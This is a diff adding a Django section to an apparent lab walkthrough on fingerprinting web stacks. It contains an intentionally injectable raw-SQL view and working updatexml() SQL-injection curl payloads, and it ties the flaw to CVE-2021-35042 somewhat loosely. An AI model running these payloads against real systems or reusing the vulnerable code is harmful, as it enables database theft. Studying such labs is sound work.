@@ -7,6 +7,7 @@ Fingerprinting modern web stacks from passive HTTP signals, then exploiting a kn
 **Table of contents**
 
 - [MERN stack](#mern-stack)
+- [Django](#django)
 
 ---
 
@@ -72,4 +73,64 @@ curl -b cookies.txt http://10.130.132.26:3000/api/admin/flag
 
 <div style="background:#fff7ed;border-left:4px solid #f59e0b;padding:12px;border-radius:6px;margin:8px 0">
 <strong>Warning:</strong> Prototype pollution mutates global process state. Only run it against authorized targets — it can affect other users and crash the app.
+</div>
+
+---
+
+## Django
+
+**Django** is the Python-native framework favoured by government, newsrooms, and Python-shop SaaS. Its ORM normally shields against SQL injection — but when a developer concatenates user input into raw SQL, or hits a flawed deprecated ORM path, the database is exposed.
+
+**CVE-2021-35042** — SQL injection in Django's `order_by()` query method. **CVSS 9.8 Critical**, no authentication required.
+
+**Typical Ubuntu deployment:** Gunicorn or the built-in dev server on port **8000**; admin panel at `/admin/` and CSRF middleware enabled by default.
+
+### Fingerprinting
+
+```bash
+curl -I "http://10.82.95.115:8000/products/"
+```
+
+| Signal | Value | Confidence |
+| --- | --- | --- |
+| `Server` header | `WSGIServer/0.2 CPython/X.X.X` | High |
+| Cookie name | `csrftoken` | High |
+| `csrfmiddlewaretoken` hidden field | in any POST form's HTML | High |
+| `X-Frame-Options` | `DENY` | High |
+| `X-Content-Type-Options` | `nosniff` | High |
+| `Referrer-Policy` | `same-origin` | Medium |
+
+- **`csrfmiddlewaretoken`** is the most reliable signal — Django's `CsrfViewMiddleware` injects it into every POST form. Absent from Express, Rails, and Next.js.
+- The trio **`X-Frame-Options: DENY` + `X-Content-Type-Options: nosniff` + `Referrer-Policy: same-origin`** together signals Django's `SecurityMiddleware` — no other framework applies all three by default.
+
+### CVE-2021-35042 — SQL injection via `order_by()`
+
+The product catalogue at `/products/` exposes a user-controlled `order` parameter that lands **unvalidated** inside an `ORDER BY` clause:
+
+```python
+order = self.request.GET.get('order', 'name')
+sql = ('SELECT id, name, price, description FROM products_product '
+       f'ORDER BY (CASE WHEN (1=1) THEN {order} ELSE name END)')
+```
+
+`1=1` is always true, so the `THEN {order}` branch always runs — that's the injection point.
+
+**`updatexml()` error-based extraction:** `updatexml(1, xpath_expr, 1)` throws when the XPath is invalid. Wrapping a `SELECT` in `concat(0x7e, ...)` (where `0x7e` = `~`, a marker) forces MySQL to leak the query result inside the error message, surfaced in the HTTP 500 body.
+
+```bash
+# 1. Confirm injection + read MySQL version (~ prefix = payload executed)
+curl -s "http://TARGET:8000/products/?order=updatexml(1,concat(0x7e,(select%20@@version)),1)" \
+  | grep -o '~[0-9][^&]*'
+# -> ~8.0.45-0ubuntu0.22.04.1   (500 page also shows Django Version: 3.2.4)
+
+# 2. Extract the current database name
+curl -s "http://TARGET:8000/products/?order=updatexml(1,concat(0x7e,(select%20database())),1)" \
+  | grep -o '~[0-9a-zA-Z_][^&]*'
+# -> ~vuln_db
+```
+
+From here, feed the injection point to **sqlmap** to enumerate and dump the full database.
+
+<div style="background:#fff7ed;border-left:4px solid #f59e0b;padding:12px;border-radius:6px;margin:8px 0">
+<strong>Warning:</strong> The <code>updatexml()</code> error technique only works when <code>DEBUG = True</code> in <code>settings.py</code> — a production app (<code>DEBUG = False</code>) returns a generic 500 with no details. Verify first; if debug output is suppressed, fall back to blind time-based injection with <code>SLEEP()</code>.
 </div>
